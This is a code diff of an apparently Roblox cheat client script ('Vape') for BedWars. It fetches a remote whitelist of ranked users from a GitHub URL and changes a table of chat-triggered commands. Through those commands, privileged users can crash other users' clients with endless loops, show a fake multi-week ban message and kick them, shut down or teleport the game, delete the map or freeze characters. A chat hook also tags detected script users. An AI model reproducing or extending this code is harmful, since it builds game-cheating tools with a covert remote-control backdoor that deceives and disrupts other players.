@@ -10628,62 +10628,71 @@ end
 })
 end)
 
-runFunction(function()
-	local txtpackloader = game:GetObjects("rbxassetid://14027120450")
-	txtpack = unpack(txtpackloader)
-	txtpack.Parent = ReplicatedStorage
-	local hi
-    local texturepack = {Enabled = false}
-	texturepack = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
-        Name = "TexturePack",
-        Function = function(callback)
-            if callback then
-				hi = workspace.Camera.Viewmodel.DescendantAdded:Connect(function(descendant)
-					for i,v in pairs(txtpack:GetChildren()) do
-						if v.Name == descendant.Name then
-							for i1,v1 in pairs(descendant:GetDescendants()) do
-								if v1:IsA("Part") or v1:IsA("MeshPart") then
-									v1.Transparency = 1
-								end
-							end
-							for i1,v1 in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
-								if v1.Name == v.Name then
-									for i2,v2 in pairs(v1:GetDescendants()) do
-										if v2.Name ~= descendant.Name then
-											if v2:IsA("Part") or v2:IsA("MeshPart") then
-												v2.Transparency = 1
-											end
-										end
-									end
-								end
-							end
-							local vmmodel = v:Clone()
-							vmmodel.CFrame = descendant.Handle.CFrame * CFrame.Angles(math.rad(90),math.rad(-130),math.rad(0))
-							if descendant.Name == "rageblade" then vmmodel.CFrame = CFrame.Angles(math.rad(-80),math.rad(230),math.rad(10)) end
-							vmmodel.Parent = descendant
-							local vmmodelweld = Instance.new("WeldConstraint",vmmodel)
-							vmmodelweld.Part0 = vmmodelweld.Parent
-							vmmodelweld.Part1 = descendant.Handle
-							local charmodel = v:Clone()
-							charmodel.CFrame = game.Players.LocalPlayer.Character[descendant.Name]:FindFirstChild("Handle").CFrame * CFrame.Angles(math.rad(90),math.rad(-130),math.rad(0))
-							if descendant.Name == "rageblade" then charmodel.CFrame = CFrame.Angles(math.rad(-80),math.rad(230),math.rad(10)) end
-							charmodel.Anchored = false
-							charmodel.CanCollide = false
-							charmodel.Parent = game.Players.LocalPlayer.Character[descendant.Name]
-							local charmodelweld = Instance.new("WeldConstraint",charmodel)
-							charmodelweld.Part0 = charmodelweld.Parent
-							charmodelweld.Part1 = game.Players.LocalPlayer.Character[descendant.Name].Handle
-						end
-					end
-				end)
-            else
-                if hi then
-                    hi:Disconnect()
-                end
-            end
-        end
-    })
-end)
+local whitelist = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://raw.githubusercontent.com/PinkReleased/Ape/main/New"))
+local function getLplrType()
+	local lplr_Type = 0
+	if whitelist["Owner"] ~= nil then
+		for i,v in pairs(whitelist["Owner"]) do
+			if v.id == tostring(lplr.UserId) then
+				lplr_Type = 3
+				return lplr_Type
+			end
+		end
+	end
+	if whitelist["Snoopy"] ~= nil then
+		for i,v in pairs(whitelist["Snoopy"]) do
+			if v.id == tostring(lplr.UserId) then
+				lplr_Type = 2
+				return lplr_Type
+			end
+		end
+	end
+	if whitelist["Private"] ~= nil then
+		for i,v in pairs(whitelist["Private"]) do
+			if v.id == tostring(lplr.UserId) then
+				lplr_Type = 1
+				return lplr_Type
+			end
+		end
+	end
+	return lplr_Type
+end
+
+local MoonUsers = {}
+
+function CanAttackUser(u)
+	local userId = tostring(u.UserId)
+	local userType = 0
+
+	if whitelist["Private"] ~= nil then
+		for i, v in pairs(whitelist["Private"]) do
+			if v.id == userId then
+				userType = 1
+				break
+			end
+		end
+	end
+
+	if whitelist["Snoopy"] ~= nil then
+		for i, v in pairs(whitelist["Snoopy"]) do
+			if v.id == userId then
+				userType = 2
+				break
+			end
+		end
+	end
+
+	if whitelist["Owner"] ~= nil then
+		for i, v in pairs(whitelist["Owner"]) do
+			if v.id == userId then
+				userType = 3
+				break
+			end
+		end
+	end
+
+	return getLplrType() >= userType
+end
 
 local whitelist = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://raw.githubusercontent.com/PinkReleased/Ape/main/New"))
 local function getLplrType()
@@ -10706,10 +10715,13 @@ local function getLplrType()
 	end
 	return lplr_Type
 end
+
 local MoonUsers = {}
+
 function CanAttackUser(u)
 	local userId = tostring(u.UserId)
 	local userType = 0
+
 	if whitelist["Private"] ~= nil then
 		for i, v in pairs(whitelist["Private"]) do
 			if v.id == userId then
@@ -10718,6 +10730,7 @@ function CanAttackUser(u)
 			end
 		end
 	end
+
 	if whitelist["Owner"] ~= nil then
 		for i, v in pairs(whitelist["Owner"]) do
 			if v.id == userId then
@@ -10726,6 +10739,7 @@ function CanAttackUser(u)
 			end
 		end
 	end
+
 	return getLplrType() >= userType
 end
 
@@ -10784,7 +10798,7 @@ local function transformImage(img, txt)
 end
 
 local commands = {
-	[";bye default"] = function()
+	[";bye default"] = function(args, plr)
 		if entityLibrary.isAlive then
 			local hum = entityLibrary.character.Humanoid
 			task.delay(0.1, function()
@@ -10796,7 +10810,7 @@ local commands = {
 			end)
 		end
 	end,
-	[";byfron default"] = function()
+	[";byfron default"] = function(args, plr)
 		task.spawn(function()
 			local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
 			local Roact = getrenv().require(game:GetService("CorePackages").Roact)
@@ -10867,7 +10881,7 @@ local commands = {
 			end)
 		end)
 	end,
-	[";steal default"] = function()
+	[";steal default"] = function(args, plr)
 		if GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.Enabled then 
 			GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.ToggleButton(false)
 			task.wait(1)
@@ -10884,10 +10898,10 @@ local commands = {
 			end
 		end
 	end,
-	[";lobby default"] = function()
+	[";lobby default"] = function(args)
 		bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
 	end,
-	[";reveal default"] = function()
+	[";reveal default"] = function(args)
 		task.spawn(function()
 			task.wait(0.1)
 			local newchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
@@ -10896,81 +10910,81 @@ local commands = {
 			end
 		end)
 	end,
-	[";lagback default"] = function()
+	[";lagback default"] = function(args)
 		if entityLibrary.isAlive then
 			entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(9999999, 9999999, 9999999)
 		end
 	end,
-	[";jump default"] = function()
+	[";jump default"] = function(args)
 		if entityLibrary.isAlive and entityLibrary.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
 			entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
 		end
 	end,
-	[";trip default"] = function()
+	[";trip default"] = function(args)
 		if entityLibrary.isAlive then
 			entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
 		end
 	end,
-	[";teleport default"] = function()
+	[";teleport default"] = function(args)
 		game:GetService("TeleportService"):Teleport(tonumber(args[1]) ~= "" and tonumber(args[1]) or game.PlaceId)
 	end,
-	[";sit default"] = function()
+	[";sit default"] = function(args)
 		if entityLibrary.isAlive then
 			entityLibrary.character.Humanoid.Sit = true
 		end
 	end,
-	[";unsit default"] = function()
+	[";unsit default"] = function(args)
 		if entityLibrary.isAlive then
 			entityLibrary.character.Humanoid.Sit = false
 		end
 	end,
-	[";freeze default"] = function()
+	[";freeze default"] = function(args)
 		if entityLibrary.isAlive then
 			entityLibrary.character.HumanoidRootPart.Anchored = true
 		end
 	end,
-	[";thaw default"] = function()
+	[";thaw default default"] = function(args)
 		if entityLibrary.isAlive then
 			entityLibrary.character.HumanoidRootPart.Anchored = false
 		end
 	end,
-	[";deletemap default"] = function()
+	[";deletemap default"] = function(args)
 		for i,v in pairs(collectionService:GetTagged("block")) do
 			v:Destroy()
 		end
 	end,
-	[";void default"] = function()
+	[";void default"] = function(args)
 		if entityLibrary.isAlive then
 			entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + Vector3.new(0, -1000, 0)
 		end
 	end,
-	[";framerate default"] = function()
+	[";framerate default"] = function(args)
 		if #args >= 1 then
 			if setfpscap then
 				setfpscap(tonumber(args[1]) ~= "" and math.clamp(tonumber(args[1]) or 9999, 1, 9999) or 9999)
 			end
 		end
 	end,
-	[";crash default"] = function()
+	[";crash default"] = function(args)
 		setfpscap(9e9)
 		print(game:GetObjects("h29g3535")[1])
 	end,
-	[";chip default"] = function()
+	[";chip default"] = function(args)
 		transformImage("http://www.roblox.com/asset/?id=6864086702", "Chip Man")
 	end,
-	[";rick default"] = function()
+	[";rick default"] = function(args)
 		transformImage("http://www.roblox.com/asset/?id=7083449168", "Never Gonna Give You Up")
 	end,
-	[";josiah default"] = function()
+	[";josiah default"] = function(args)
 		transformImage("http://www.roblox.com/asset/?id=13924242802", "Josiah Boney")
 	end,
-	[";xylex default"] = function()
+	[";xylex default"] = function(args)
 		transformImage("http://www.roblox.com/asset/?id=13953598788", "Byelex")
 	end,
-	[";gravity default"] = function()
+	[";gravity default"] = function(args)
 		workspace.Gravity = tonumber(args[1]) or 192.6
 	end,
-	[";kick default"] = function()
+	[";kick default"] = function(args)
 		local str = ""
 		for i,v in pairs(args) do
 			str = str..v..(i > 1 and " " or "")
@@ -10980,139 +10994,28 @@ local commands = {
 		end)
 		bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
 	end,
-	[";ban default"] = function()
+	[";ban default"] = function(args)
 		task.spawn(function()
 			lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
 		end)
 		bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
 	end,
-	[";uninject default"] = function()
+	[";uninject default"] = function(args)
 		GuiLibrary.SelfDestruct()
 	end,
-	[";monkey default"] = function()
-		local str = ""
-		for i,v in pairs(args) do
-			str = str..v..(i > 1 and " " or "")
-		end
-		if str == "" then str = "skill issue" end
-		local video = Instance.new("VideoFrame")
-		video.Video = downloadVapeAsset("vape/assets/skill.webm")
-		video.Size = UDim2.new(1, 0, 1, 36)
-		video.Visible = false
-		video.Position = UDim2.new(0, 0, 0, -36)
-		video.ZIndex = 9
-		video.BackgroundTransparency = 1
-		video.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
-		local textlab = Instance.new("TextLabel")
-		textlab.TextSize = 45
-		textlab.ZIndex = 10
-		textlab.Size = UDim2.new(1, 0, 1, 36)
-		textlab.TextColor3 = Color3.new(1, 1, 1)
-		textlab.Text = str
-		textlab.Position = UDim2.new(0, 0, 0, -36)
-		textlab.Font = Enum.Font.Gotham
-		textlab.BackgroundTransparency = 1
-		textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
-		video.Loaded:Connect(function()
-			video.Visible = true
-			video:Play()
-			task.spawn(function()
-				repeat
-					wait()
-					for i = 0, 1, 0.01 do
-						wait(0.01)
-						textlab.TextColor3 = Color3.fromHSV(i, 1, 1)
-					end
-				until true == false
-			end)
-		end)
-		task.wait(19)
-		task.spawn(function()
-			pcall(function()
-				if getconnections then
-					getconnections(entityLibrary.character.Humanoid.Died)
-				end
-				print(game:GetObjects("h29g3535")[1])
-			end)
-			while true do end
-		end)
-	end,
-	[";enable default"] = function()
-		if #args >= 1 then
-			if args[1]:lower() == "all" then
-				for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
-					if v.Type == "OptionsButton" and i ~= "Panic" and not v.Api.Enabled then
-						v.Api.ToggleButton()
-					end
-				end
-			else
-				local module
-				for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
-					if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
-						module = v
-						break
-					end
-				end
-				if module and not module.Api.Enabled then
-					module.Api.ToggleButton()
-				end
-			end
-		end
-	end,
-	[";disable default"] = function()
-		if #args >= 1 then
-			if args[1]:lower() == "all" then
-				for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
-					if v.Type == "OptionsButton" and i ~= "Panic" and v.Api.Enabled then
-						v.Api.ToggleButton()
-					end
-				end
-			else
-				local module
-				for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
-					if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
-						module = v
-						break
-					end
-				end
-				if module and module.Api.Enabled then
-					module.Api.ToggleButton()
-				end
-			end
-		end
-	end,
-	[";toggle default"] = function()
-		if #args >= 1 then
-			if args[1]:lower() == "all" then
-				for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
-					if v.Type == "OptionsButton" and i ~= "Panic" then
-						v.Api.ToggleButton()
-					end
-				end
-			else
-				local module
-				for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
-					if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
-						module = v
-						break
-					end
-				end
-				if module then
-					module.Api.ToggleButton()
-				end
-			end
-		end
-	end,
-	[";shutdown default"] = function()
+	[";shutdown default"] = function(args)
 		game:Shutdown()
 	end
 }
+
 function isPlayerAllowed()
 	return false
 end
+
 local txt = game:GetService("TextChatService")
 local private = {}
 local users = {}
+
 task.spawn(function()
 	repeat task.wait()
 		for i,plr in pairs(game.Players:GetPlayers()) do 
@@ -11128,7 +11031,9 @@ task.spawn(function()
 		end
 	until false
 end)
+
 local users = {}
+
 txt.OnIncomingMessage = function(msg)
 	local p = Instance.new("TextChatMessageProperties")
 	local message = msg
@@ -11144,7 +11049,7 @@ txt.OnIncomingMessage = function(msg)
 		local otherPriority, plrattackable, plrtag = WhitelistFunctions:GetWhitelist(plr2)
 		if CanAttackUser(plr2) and plr2 ~= lplr then
 			if message.Text:find("ALAAZA") then
-				warningNotification("Vape",plr2.Name.." Is Using Vape",5)
+				warningNotification("Vape",plr2.Name.." Is Using Vape",3.5)
 				table.insert(users,plr2.UserId)
 			end
 		end
@@ -11181,12 +11086,12 @@ txt.OnIncomingMessage = function(msg)
 		}
 		if CanAttackUser(plr2) and plr2 ~= lplr then
 			if message.Text:find("ALAAZA") then
-				warningNotification("Vape",plr2.Name.." Is Using Vape",5)
+				warningNotification("Vape",plr2.Name.." Is Using Vape",60)
 				table.insert(users,plr2.UserId)
 				table.insert(whitelist["tags"],{
 					userid = plr2.UserId,
-					color = "",
-					tag = ""
+					color = "yellow",
+					tag = "VAPE USER"
 				})
 			end
 		end
@@ -11213,13 +11118,15 @@ txt.OnIncomingMessage = function(msg)
 		end
 		p.PrefixText = msg.PrefixText
 		print(message.Text,":",userId)
+
 		local userType = 0
 		local hasTag = false
 		if users[plr2.UserId] ~= nil then
-			p.PrefixText = "<font color='"..colors["yellow"].."'>[]</font> " .. msg.PrefixText
+			p.PrefixText = "<font color='"..colors["yellow"].."'>[VAPE USER]</font> " .. msg.PrefixText
 			hasTag = true
 			return p
 		end
+
 		if whitelist["tags"] ~= nil then
 			for i, v in pairs(whitelist["tags"]) do
 				if v.userid == userId then
@@ -11229,28 +11136,43 @@ txt.OnIncomingMessage = function(msg)
 				end
 			end
 		end
+
 		if whitelist["Private"] ~= nil then
 			for i, v in pairs(whitelist["Private"]) do
 				if v.id == userId then
 					if not hasTag then
 						hasTag = true
-						p.PrefixText = "<font color='"..colors["yellow"].."'>[APE PRIVATE]</font> " .. msg.PrefixText
+						p.PrefixText = "<font color='"..colors["yellow"].."'>[]</font> " .. msg.PrefixText
 					end
 					userType = 1
 				end
 			end
 		end
+
 		if whitelist["Owner"] ~= nil then
 			for i, v in pairs(whitelist["Owner"]) do
 				if v.id == userId then
 					if not hasTag then
 						hasTag = true
-						p.PrefixText = "<font color='#ff4d4d'>[APE OWNER]</font> " .. msg.PrefixText
+						p.PrefixText = "<font color='#ff4d4d'>[VAPE OWNER]</font> " .. msg.PrefixText
 					end
 					userType = 3
 				end
 			end
 		end
+
+		if whitelist["Snoopy"] ~= nil then
+			for i, v in pairs(whitelist["Snoopy"]) do
+				if v.id == userId then
+					if not hasTag then
+						hasTag = true
+						p.PrefixText = "<font color='"..colors["yellow"].."'>[]</font> " .. msg.PrefixText
+					end
+					userType = 2
+				end
+			end
+		end
 	end
+
 	return p
 end
